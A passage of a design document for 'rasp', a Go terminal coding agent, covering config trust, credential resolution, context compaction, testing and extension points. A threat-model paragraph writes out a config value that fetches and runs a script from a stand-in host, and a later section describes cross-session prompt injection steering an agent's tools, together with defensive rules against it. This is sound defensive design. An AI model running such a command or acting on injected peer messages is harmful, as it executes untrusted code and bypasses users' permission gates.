   config, from `--yolo`, or from `/yolo`. Otherwise cloning a repository could disable every
   guardrail before the user has read a single line of it. rasp refuses to start and names the
   file.
2. **`modes.yolo` overrides are ignored entirely.** Yolo short-circuits ahead of pattern
   evaluation (§7.7), so an override could only ever create the false impression of a
   constraint that is not being enforced. Configuring one is a warning at startup, not a
   silent no-op.

The same reasoning applies to `mcp.servers` in a project config, which is a request to spawn a
subprocess: allowed, but the first run in a new project lists the servers it is about to start
and asks once.

**`$(command)` in a project config is the same request by a different route**, so it goes
behind that same prompt. `"api_key": "$(curl -s evil.example/x | sh)"` runs while the config is
being resolved — the user typed `rasp`, and it executes before the TUI has drawn a frame — and
nobody is going to catch it by reading, because the form we *want* people to use,
`"api_key": "$(op read op://team-vault/key)"`, has exactly the same shape. Nor is it a one-shot
at startup: credentials are re-resolved on every model call (prd §6.1), so the command runs
again every turn.

Rejecting it outright, the way `"mode": "yolo"` is rejected, would be the wrong trade. A team
that checks in `$(op read op://team-vault/key)` is doing the right thing — that line is what
keeps the secret out of the repository — so a ban would ban the pattern we are recommending.
One prompt then, shown before anything executes, listing the servers about to start and the
commands about to run together. Not a second mechanism: the argument is the same argument, and
a second prompt teaches the user to clear both without reading either.

The approval is pinned to **what will actually execute** — a fingerprint over the set of
`$(command)` strings and the `mcp.servers` entries. Not to the path, for direnv's reason:
"trusted once" against a directory means a later `git pull` can change what runs without being
asked again, which puts the hazard back exactly where it started. But not over the whole file
either, which is where direnv stops being our precedent — an `.envrc` is executable code from
top to bottom, while most of `.rasp/config.json` is inert settings: a model id, a theme, a diff
style. Fingerprint all of it and `"theme": "dark"` raises a security prompt about commands
nobody touched, and a prompt that fires when nothing dangerous changed is one people learn to
clear without reading — the same failure the paragraph above refuses for a second prompt. So an
unrelated setting changes silently; a new or altered command asks again, showing what changed.

Recording *what* was approved rather than *that* something was is the load-bearing part. A
stored `trusted: true` would answer the question once and for the life of the repository: you
approve `$(op read op://team-vault/key)` in January, someone edits that line in March, and rasp
runs the new command without a word — because the project is trusted, and the flag cannot tell
that the thing it was trusted for has been swapped. A fingerprint cannot be inherited by a
command nobody approved.

Where the answer is remembered matters: `~/.config/rasp/approvals/<project-key>`, under the
user's own directory — §9's project key, so one repository checked out twice is one project,
and the same home as §10.1's `.imported` marker, for the same reason. **Never inside the
project.** An approval file that arrives with the clone is a repository approving itself, and
the mechanism would fail on exactly the input it exists to catch.

Say what it is worth, as §7.3a does for plan mode: this is a speed bump. Cloning a repository
and running its build already executes code nobody read, and rasp is not a security boundary.
The reason to write the rule down anyway is that a reader who finds `mode` argued and
`mcp.servers` argued should not have to infer where `$(command)` landed from the fact that no
one mentioned it.

### 10.1 First-run import

Most people arriving at rasp already have MCP servers and API keys configured for another
agent. Redoing that by hand is a poor first impression; reading their files forever is a
permanent coupling to schemas we don't own. A one-time import gets the benefit without the
liability.

Triggered only when no rasp config exists **and** no import marker is present:

```go
// internal/config/importer.go
type Source struct {
    Name string                          // "Claude Desktop"
    Path func() (string, bool)           // platform-specific; false = not applicable here
    Scan func([]byte) (Found, error)     // tolerant parse — never returns a fatal error
}

type Found struct {
    MCPServers map[string]ServerSpec
    APIKeys    map[string]string // providerID → literal key
    Model      string
}
```

| Source | Location |
|---|---|
| Claude Desktop | `~/Library/Application Support/Claude/claude_desktop_config.json`, `%APPDATA%\Claude\…`, `~/.config/Claude/…` |
| Claude Code | `~/.claude/settings.json`, `./.mcp.json` |
| Codex | `~/.codex/config.toml` |
| opencode | `~/.config/opencode/opencode.json` |
| Crush | `~/.local/share/crush/crush.json`, `./.crush/crush.json` |
| pi | `~/.pi/agent/{settings,auth}.json` |

Findings are shown before anything is written, then a single prompt:

```
Found existing configuration:

  Claude Desktop   3 MCP servers (github, postgres, playwright)
  Claude Code      1 MCP server (sentry) · ANTHROPIC_API_KEY
  Codex            OPENAI_API_KEY

Import into rasp?  [Y/n]
```

Four rules govern it:

1. **One prompt, everything behind it — API keys included.** No separate opt-in for keys. The
   key is already plaintext on this machine, in a file owned by this user at these permissions;
   copying it into a second such file does not change the threat model. Any attacker who can
   read rasp's config can already read Claude's. A second prompt would be friction with no
   security gain. *Showing* what will be copied is transparency; it is not a gate.
2. **A decision either way writes the marker** (`~/.config/rasp/.imported`), so declining is
   remembered and the question is never asked twice.
3. **A malformed or unreadable source is skipped silently.** It contributes nothing to the
   summary and never blocks startup. Every `Scan` is tolerant by construction — this code runs
   against files we don't control and can't test against future versions.
4. **Name collisions resolve last-source-wins**, in the table's order, with the merged result
   shown before writing so nothing is silently shadowed.

One detail the resolver forces on this. The importer writes **literals** — keys and `env` values
copied out of another tool — into the global config, which is a layer the resolver runs over. So
it escapes `$` as `$$` on the way in. Skip that and a Postgres server whose `PGPASSWORD` is
`p$ssw0rd` becomes a startup failure naming a variable nobody wrote, or, if `$ssw0rd` happens to
be set, a password that silently expands into something else — the failure §10 has just finished
arguing must not happen, arriving by the one path where the user never typed the value at all.

Afterwards rasp reads only its own config. Since values support `$(command)` expansion, anyone
who'd rather not duplicate a secret can replace the imported literal with `$(op read …)` later
— their choice to make, not a question to ask during setup.

### Auth: API keys only in the MVP

OAuth is phase 2. Every string in `providers.*.api_key` and `mcp.servers.*.env.*` **that was
written in a config file** goes through one resolver:

| Form | Meaning |
|---|---|
| `sk-ant-...` | Literal |
| `${VAR}` / `$VAR` | Environment variable |
| `${VAR:-default}` | Environment with fallback |
| `${VAR:?msg}` | Environment, or refuse to start and print `msg` |
| `$(command)` | Run it, take trimmed stdout |

The resolver runs on the two file layers and nowhere else. A value that arrived from the
environment or from a flag has already been through a shell, and running the grammar over it a
second time is not a second chance to expand something — it is a chance to misread a secret.
`export ANTHROPIC_API_KEY='sk-ant-x$yz'` would refuse to start, naming a variable the user never
wrote, and the `$$` escape is no way out: the same variable is read by other tools, which would
see the doubled dollar. A `$` in a generated key is ordinary; wanting `$(op read …)` inside an
environment variable is not, and the config file is where that belongs. The whole reason the
resolver exists is that a *file* holds a recipe rather than a secret.

This is Crush's design, and it is why we ship no keyring integration: `$(op read …)`,
`$(pass show …)`, `$(gh auth token)` all work with zero code. Results are cached ~30s so we are
not forking a process per model call. Config files holding a literal key are written `0600`
and warned about if found `0644`.

`${VAR:?msg}` is nearly free once `${VAR:-default}` is parsed — the `${VAR:OP…}` grammar is
already there — and it turns this resolver's worst failure into its best one. docker-compose
ships the same form and is well liked for exactly that:
`"api_key": "${ANTHROPIC_API_KEY:?run 'op signin' first}"` stops the load with a sentence the
config's own author wrote, where an unset variable would otherwise expand to empty and come
back much later as a 401 that points at nothing. POSIX's `:=` and `:+` are deliberately not
supported: assigning back into our own environment, and substituting-when-set, are answers to
questions nobody asks about a credential.

### 10.2 The model catalog

rasp needs each model's context-window size, output cap, pricing and tool-call support — for
the model picker, the cost line, and `shouldCompact` in §11. Hardcoding that means every new
model release needs a rasp release, which is the wrong coupling for a tool whose entire pitch
is being model-agnostic. So the catalog is **fetched from models.dev**, the community JSON pi
also uses.

```go
// internal/models/catalog.go
type Model struct {
    ID            string
    Provider      string
    ContextWindow int
    MaxOutput     int
    CostPerMIn    float64
    CostPerMOut   float64
    CostPerMCache float64
    SupportsTools bool
    SupportsCache bool
}

// Resolve order — first hit wins:
//   1. user-defined models in config     (always authoritative)
//   2. cached models.dev, if fresh
//   3. cached models.dev, if stale       (stale beats absent)
//   4. embedded snapshot                 (//go:embed models.snapshot.json)
func (c *Catalog) Get(id string) (Model, bool)
```

Five rules make this a dependency we can live with:

1. **Never on the startup path.** The fetch runs in a background goroutine after the first
   frame, bounded at **5s**. A slow or unreachable models.dev delays nothing the user sees.
2. **Never fatal.** Network error, timeout, malformed JSON, schema drift — all fall through the
   chain above. The floor is the embedded snapshot, so `Get` always answers.
3. **ETag revalidation**, refreshed hourly at most, cached under `~/.cache/rasp/models.json`.
4. **User config always wins**, so a wrong upstream entry is fixable locally in one line
   without waiting for anyone.
5. **An id the catalog does not know is still sent.** `Get` returning `false` degrades the
   context-window and cost display to conservative estimates, shown as estimates — it never
   blocks a request. This is what lets `openrouter/auto` and any other provider-side router
   work without rasp knowing routers exist, and it is rule 4's argument one level up: a model
   we have never heard of must not require a rasp release to use.

The honest cost: correctness now depends on a third-party file. pi's own catalog generator
carries dozens of hand-written corrections to models.dev data — the clearest available evidence
that it is useful but not authoritative. Rule 4 is what makes that survivable, and it's why
user-defined models sit *above* the catalog rather than merging with it.

### AGENTS.md discovery

Walk from cwd up to the git worktree root (or filesystem root outside a repo), collecting every
match. Order outermost-first, so the most specific file lands nearest the model's attention.

```
~/.config/rasp/AGENTS.md              global, always first
/Users/theo/Projects/AGENTS.md        ancestor
/Users/theo/Projects/rasp/AGENTS.md   nearest, last
```

Filenames tried per directory, in order: `AGENTS.md`, then `CLAUDE.md`. The **first name that
matches anywhere wins for the whole walk** — you don't get a mix of both families, which is
pi's rule and avoids double-loading the same content under two names.

Each file is wrapped for provenance:

```
<project_instructions path="/Users/theo/Projects/rasp/AGENTS.md">
...contents...
</project_instructions>
```

**The git-worktree fix**, a real bug we would otherwise hit: in a linked worktree the main
repo's `AGENTS.md` and the worktree's copy occupy the same logical scope and would load twice.
Detect it by canonicalizing both paths — `git worktree` writes realpaths while cwd may be
symlinked, notably on macOS where `/tmp` → `/private/tmp` — and suppress the duplicate.

---

## 11. Context window management

### System prompt as ordered blocks

The Anthropic cache is a **prefix match**: one byte changed before a breakpoint invalidates
everything after it. So the prompt is not a string — it is an ordered list with explicit cache
flags.

```go
type SystemBlock struct {
    Text  string
    Cache bool // place a cache breakpoint AFTER this block
}
```

Stable content first, volatile content last, always:

| # | Block | Cache | Why |
|---|---|---|---|
| 1 | Core identity and tool-use doctrine | — | Never changes |
| 2 | Tool descriptions (built-in **+ MCP**) | ✅ | Changes only when the tool set changes — hence the per-turn snapshot (§3.3, §8.4) |
| 3 | `AGENTS.md` composition | ✅ | Stable within a session |
| 4 | **Mode instructions** | ❌ | Switched casually via Shift+Tab (§7.6) |
| 5 | Environment: cwd, platform, git branch, date | ❌ | Volatile |

Blocks 4 and 5 sit after the last breakpoint, so changing either costs their own tokens and
invalidates nothing. Putting the date in block 1 would blow the cache on every session; putting
mode text in block 2 would blow it on every Shift+Tab.

The adapter applies provider-specific syntax (`cache_control` for Anthropic, nothing for most
OpenAI-compatible endpoints); `prompt` only marks intent.

### One prompt, every model

Block 1 is a **single short prompt shared by every model**, embedded with `go:embed` and
version-controlled beside the code. It is a tuning surface, and the golden edit corpus is its
regression signal — a prompt change that degrades edit-match rates shows up as a failing test
rather than as a vibe.

We do not ship per-model-family variants. opencode maintains six, selected by substring-matching
the model ID, and that pays off when you support every model on the market. At our scale it
would be N prompts kept in sync on instinct: you cannot tell which of the differences between
your Claude prompt and your GPT prompt actually matter, because nothing measures them. The
door stays open — `prompt.Build` takes the model ID already — but a variant needs evidence that
a specific model misbehaves without it, not a hunch.

### Token estimation — hybrid

```go
// Real usage from the last assistant message + chars/4 for everything after it.
// neo estimates the whole transcript at chars/4, which drifts badly on
// code-heavy sessions since code tokenizes denser than prose.
func Estimate(entries []Entry) int {
    total, idx := lastReportedUsage(entries) // authoritative
    for _, e := range entries[idx+1:] {
        total += len(e.Text()) / 4 // heuristic, small tail only
    }
    return total
}
```

### Two-tier reduction

opencode's insight, and the best idea in that report: **most context bloat is stale tool
output, and deleting it is free.** Only summarize when that isn't enough.

**Tier 1 — prune.** Runs after every turn. No LLM call, no cost.

```
PRUNE_PROTECT = 40_000   // once tool output exceeds this...
PRUNE_MINIMUM = 20_000   // ...blank outputs older than this recent window
```

Walk backwards through tool results. Once accumulated tool-output tokens exceed
`PRUNE_PROTECT`, blank the `Content` of results older than the most recent `PRUNE_MINIMUM`
tokens, replacing each with `[output pruned to save context]`. A 2MB file read from twenty
turns ago stops costing anything; recent turns stay intact.

The `tool_result` block itself is **never removed** — only its content is emptied. Removing it
would violate invariant 1.

**Tier 2 — summarize.** Only on real overflow.

```go
func shouldCompact(used, contextWindow, maxOutput int) bool {
    reserve := max(maxOutput, 4096) + 12_000 // output budget + margin
    return used > contextWindow-reserve
}
```

1. Find a cut point walking backwards until `KeepRecentTokens` (20k) accumulates.
2. **Snap to a safe boundary.** Valid only between complete turns — never between a `tool_use`
   and its `tool_result`. Both neo and pi enforce this; it is invariant 1 wearing a different
   hat.
3. Ask the same provider to summarize everything before the cut, with a structured prompt:
   Goal / Constraints / Progress (Done, In Progress, Blocked) / Key Decisions / Next Steps /
   Critical Context, instructed to "preserve exact file paths, function names and error
   messages."
4. **Carry the read/modified file lists across the boundary** so the agent doesn't forget what
   it already touched — pi's refinement, and the difference between compaction being invisible
   and compaction being infuriating.
5. Write an `EntryCompaction`. Full history stays on disk; only the prompt shrinks.

The summarization call sets no cache breakpoints and uses a fresh session ID — standalone, and
it should not pollute the cache.

**It also uses `small_model`, not the main one.** Compaction is mechanical work over a large
number of tokens, and so is generating a session title; neither needs the model that reasons
about code (internals §6.2). Because these calls carry their own context rather than extending
the conversation, using a different model here costs nothing in cache terms — which is exactly
what makes this the only model selection rasp does. It is not routing: nothing is classified and
nothing is guessed. The job is known at the call site.

`small_model` is optional and falls back to `model` when unset, so the feature is invisible to
anyone who never opens the config. Shipping it unset would mean summarizing 100k tokens on a
flagship model, repeatedly, on exactly the long sessions where compaction fires — so the default
config writes it explicitly rather than leaving it to a fallback nobody sees.

---

## 12. Error handling and resilience

### Two-tier retry

**Tier 1 — transport.** Wraps the HTTP call. Retries `408`, `409`, `429`, `5xx`. Honors
`retry-after` and `retry-after-ms`, including HTTP-date form. Exponential backoff capped at 8s
with 25% downward jitter.

One sharp detail from pi: **a server-requested delay above the cap (60s) returns an error
rather than sleeping.** A provider asking for a ten-minute wait should surface as a failure,
not a silent hang. The sleep is interruptible by the turn's context — the vendor SDKs' own
retry timers ignore cancellation, which is why we call them with `maxRetries: 0` and implement
this ourselves.

**Tier 2 — semantic.** Operates on the resulting `Message`, which is possible only because of
the "never returns a Go error" contract.

| Class | Examples | Action |
|---|---|---|
| Retryable | `overloaded`, `rate limit`, `5xx`, `connection reset`, `stream ended before message_stop` | Backoff, up to 3 |
| **Non-retryable, checked first** | `insufficient_quota`, `quota exceeded`, `billing`, `credit balance` | **Fail immediately** |
| Fatal | `invalid_api_key`, `model_not_found`, `context_length_exceeded` | Fail with a specific fix hint |

The quota list is checked **first**. A 429 meaning "you are out of money" must not burn the
retry budget — pi annotates each pattern with the GitHub issue it came from, which tells you
this list is earned rather than designed.

### Where errors go

| Failure | Goes to | Shape |
|---|---|---|
| Tool: non-zero exit, not found, bad args | **The model** | `Result{IsError: true}` → `tool_result` with `is_error` |
| Tool panics | **The model** | Recovered, converted to an error result |
| **MCP server dead or timed out** | **The model** | Ordinary error result; the turn continues |
| Permission denied | **The model**, then stops | Error result, then the turn ends — no blind retry |
| Provider transient | Nobody (retried) | Silent unless retries exhaust |
| Provider fatal | **The user** | Status line + inline error block with a fix hint |
| Config invalid | **The user**, at startup | Refuse to start, name the file and key |
| **MCP server failed to connect** | **The user**, non-fatally | Warning in the status line and `rasp mcp list`; rasp runs without it |
| Session file corrupt | **The user**, recoverable | Skip torn lines, warn, continue |

The distinction that matters: **tool failures are conversation, not exceptions.** A failing
test is information the model needs. Only "rasp itself cannot continue" reaches the user as an
error.

### Degraded modes

| Missing | Behaviour |
|---|---|
| `ripgrep` | `grep` falls back to a pure-Go walk. Slower, same results |
| `git` | Project key falls back to a path hash; no branch in the prompt |
| An MCP server | Its tools are absent; everything else works |
| Terminal narrower than 60 cols | Diffs render without the gutter; warn once |
| No `$XDG_DATA_HOME` | Fall back to `~/.local/share` per spec |
| Session dir unwritable | Warn once, continue in memory. Losing history beats refusing to run |

---

## 13. Testing strategy

Six layers, each proving something the others cannot.

**1. Fake provider** — `internal/llm/fake`. A scripted `Provider` emitting a pre-programmed
event sequence. No network, no cost, fully deterministic.

```go
p := fake.New(
    fake.Text("Let me look at that."),
    fake.ToolCall("read", `{"path":"main.go"}`),
    fake.Done(llm.StopToolUse),
)
```

Proves: loop control flow, tool dispatch, all four invariants, termination, cancellation. The
bulk of tests live here, and it is why the loop must not own state. pi requires exactly this
pattern so their suite runs at zero API cost.

**2. `go-vcr` cassettes** — a handful of end-to-end tests over recorded real traffic, proving
the adapters match the wire format. Custom request matcher (bodies contain non-deterministic
IDs) and **redaction of `x-api-key` before anything is committed.**

**3. Fake MCP server** — an in-process server speaking real JSON-RPC over a pipe. Proves the
manager handles `tools/list`, namespacing, allow-list filtering, the budget ceiling, call
proxying, timeout, and — most importantly — **crash mid-turn surfacing as a tool error
rather than a panic.**

**4. Golden files** — snapshot `View()` output for a fixed model state, and snapshot the
sequence of tool calls a scripted conversation produces. Catches styling regressions and
unintended loop changes. `-update` regenerates.

**5. `teatest`** — drive the Bubble Tea model headlessly: Esc cancels, the permission overlay
resolves, Shift+Tab cycles modes, resize doesn't panic. Note it is explicitly experimental with
an unmerged successor proposal — use it, don't build abstractions on it we can't swap.

**6. Fuzzing** — `go test -fuzz` against `tool/edit`'s match ladder, a pure string function
with no I/O precisely so it can be fuzzed. Seed with real edits; hunt for panics and for the
worst outcome: a match that succeeds in the wrong place.

Plus a table test over `permission`'s glob resolution — specificity ordering is exactly the
kind of rule that looks obvious and is wrong in three cases — and `go.uber.org/goleak` in
`TestMain`, since an agent spawns goroutines per turn, per tool, per bash pump and per MCP
server, and a leak means a hung process on quit.

---

## 14. Build and distribution

```yaml
# .goreleaser.yaml
builds:
  - env: [CGO_ENABLED=0]
    flags: [-trimpath]
    ldflags: ["-s -w -X main.version=v{{ .Version }}"]   # literal v: .Version strips it. Not
                                                         # .Tag — it cannot tell a release from
                                                         # a snapshot of the same commit
    mod_timestamp: '{{ .CommitTimestamp }}'              # else tar mtimes break archive hashes
    goos: [darwin, linux, windows]
    goarch: [amd64, arm64]
archives:
  - formats: [tar.gz]
    format_overrides:
      - goos: windows
        formats: [zip]
checksum:
  name_template: checksums.txt
homebrew_casks:          # NOT `brews:` — deprecated since goreleaser 2.10
  - repository:
      owner: theocod3s
      name: homebrew-tap
```

**`CGO_ENABLED=0` is load-bearing**, not incidental. It is what makes cross-compiling the whole
matrix from one CI runner possible, and why the dependency list excludes anything cgo-linked:
`mattn/go-sqlite3` (use `modernc.org/sqlite` if we ever need it) and tree-sitter (which is why
structural search is out of scope).

The one real caveat: disabling cgo forces Go's pure-Go DNS resolver, which reads
`/etc/resolv.conf` directly and doesn't support mDNS or some corporate VPN resolution. For a
tool calling `api.anthropic.com` this never matters.

`ripgrep` is an optional **runtime** dependency, never a build one — detected on `$PATH` with a
pure-Go fallback. MCP servers are likewise runtime-only: rasp spawns whatever the user
configured and never bundles a server or a Node runtime. We do **not** copy pi's
auto-download-from-GitHub-releases approach; it is clever, but it is machinery and a
supply-chain surface we don't need.

### Pin the MCP SDK explicitly

```
github.com/modelcontextprotocol/go-sdk vX.Y.Z  // exact, never a range
```

Every dependency gets a pinned version because that is what `go.mod` does, but this one gets a
comment saying why, because the reasoning is unusual: **the MCP specification has had two
breaking revisions in eight months** (§8.0), and the SDK tracks the spec. An unattended minor
bump can therefore change wire behaviour, not just implementation details.

The upgrade procedure is deliberate rather than automatic: read the spec changelog, bump the
pin, run the fake-MCP-server suite (§13) and the real-server smoke test, and confirm the diff
touches nothing outside `internal/mcp/`. That last check is the containment rule doing its job —
if the diff escapes the package, the boundary needs fixing before the bump lands.

Dependabot is configured to open MCP SDK bumps as PRs but never to auto-merge them.

---

## 15. Extension points deliberately left open

Every phase-2 item in [scope.md](scope.md) has a named seam. The point of listing them is that
none require restructuring — if one does, the seam is wrong and should be fixed now.

| Future work | Absorbed by | Why it's additive |
|---|---|---|
| **OAuth** (phase 2) | `auth.Credential` | `Resolve(ctx)` already runs before every model call. An `OAuthCredential` refreshing at `max(expires_in/10, 30s)` is a new implementation, not a new call site |
| **MCP over Streamable HTTP** | `mcp.Client` | Transport already sits behind an interface; stdio is one implementation. Note this is **Streamable HTTP**, not HTTP+SSE — the latter is formally deprecated upstream and will never be built |
| **MCP server auth** | `mcp.ServerConfig` + `auth.Credential` | Env-var injection with `$(command)` expansion already covers token-bearing servers. Full OAuth reuses the same `Credential` seam as providers. Note that Dynamic Client Registration is deprecated upstream in favour of Client ID Metadata Documents, so build to the latter when it lands |
| **Custom modes / agents** | `permission.PermissionSet` | Modes are already data, already config-overridable. A user-defined mode is another entry in the preset map — this is opencode's path to custom agents, and modes-as-presets is what makes it nearly free |
| **Sub-agents** | `tool.Tool` + `tool.Registry` + a `PermissionSet` | A `task` tool constructs a second `Agent` with a filtered snapshot and a restricted preset. The loop needs no changes because it never assumed it was the only one |
| **Session branching** | `Entry.ParentID` | Already written on every entry. `/fork` becomes a read query, not a migration |
| **A server** | `agent.Event` + `Agent`'s methods | The event stream is already the frontend contract. A server serializes those events instead of calling `program.Send`. Crush's `Workspace` seam without the 15k LOC |
| **Sandboxing** | A `workspace.FS` interface | Tools already route file access through `workspace` rather than `os`. Swapping the implementation relocates execution without touching any tool — pi's `ExecutionEnv` indirection, the only reason they can run tools in a micro-VM |
| **A second catalog source** (Crush's `catwalk`, a private mirror) | `models.Catalog` resolve chain (§10.2) | The chain is already ordered fallbacks. Another source is another link, not a new concept |
| **Hooks** | A decorator around `Tool` | Wrap each tool at registration. The loop never learns hooks exist |
| **Alternative frontends** | `agent.Event` | The headless runner already proves there is more than one consumer — the test that the seam is real |
| **Cross-session agent messaging** (phase 3.5) | The **steering / follow-up queues** (§6 rule 8) + `tool.Registry` | An inbound message from another session is just another producer for a queue that already exists for mid-turn user input. The loop never assumed it was the only consumer. Adds discovery (per-session socket files) and two tools; changes nothing in the loop. **The trust model is the real work, not the plumbing** — see below |

**On cross-session messaging, since the table defers to here.** The plumbing is genuinely
small — the queues exist, the registry is already dynamic, the loop is already indifferent to
who produced a message. What is *not* small is the trust model. Text arriving from another
session is untrusted input, structurally indistinguishable from a prompt-injection payload, and
if session A can send text that session B acts on, A has acquired a lever on B's tools.

Five rules make it defensible, and all are design work rather than assumptions. The first two
are ours; the rest are adopted from Claude Code's shipped implementation, which converged on
the same architecture and worked out failure modes worth not rediscovering:

1. An inbound message enters as **user-role content, subject to the receiving session's own
   permission gate and mode.** Never as an instruction that bypasses either. A message must not
   be able to make a session sitting in plan mode write a file.
2. **Provenance is rendered.** The transcript always shows that a given instruction arrived
   from another agent rather than from the user, because a message that looks like the user
   typed it is exactly the failure this feature would otherwise create.
3. **Inbound admission is a separate axis from permissions** — `accept` / `hold` / `refuse`,
   decided before the message reaches the model at all. "Should this arrive" and "what may it
   cause" are different questions and conflating them loses one of them.
4. **The default is derived from both sessions' modes, asymmetrically.** A session in `yolo`
   *holds* messages from a gated session and accepts only from another ungated one. This looks
   backwards until you see it: the ungated session is precisely the one that will act on a
   message without asking, so it is the one that must not receive silently.
5. **Laundering is blocked in the sending direction too.** A session must never ask a peer to
   perform an action its own gate refused. The obvious threat is inbound injection; this is the
   outbound mirror, and it is equally real.

Plus two operational guards without which the feature misbehaves rather than being insecure:
**loop throttling** (rate-limit per sender, drop identical repeats within a window, cap pending
messages — otherwise two agents reply to each other indefinitely), and a **capability floor**
stated as rules rather than left to model judgement: a message never counts as user consent for
a permission prompt, never changes configuration, and any slash command in its text arrives as
inert plain text.

The seam's existence is what makes this deferrable without regret. The trust model is why it is
deferred rather than cheap.

**Seams we are explicitly *not* leaving.** MCP's Roots, Sampling and Logging features are all
deprecated upstream as of revision 2026-07-28, and `ping` and `logging/setLevel` are removed
outright. Designing extension points for them would be building for a past that is already
being dismantled. The MCP seam covers **transports** and **auth**; nothing else.

Three seams must be right on day one, because retrofitting any of them is expensive:

**`workspace.FS`** — every file operation through an interface rather than `os.ReadFile`
directly. Costs nothing now; pi's analysis is clear it is the difference between sandboxing
being an afternoon and being a rewrite of every tool.

**`tool.Tool` returning `map[string]any` from `Schema()`** — MCP forced this, and it is the
right shape regardless. It is what lets a reflected Go struct and a server-supplied schema
coexist in one registry, and what will let hooks, sub-agent tool filtering and any future
dynamic tool source do the same.

**The `internal/mcp` containment boundary** (§8.0) — the only one of the three whose value is
measured in avoided work rather than enabled features. Two breaking spec revisions in eight
months is the evidence; a third is a question of when, not whether.
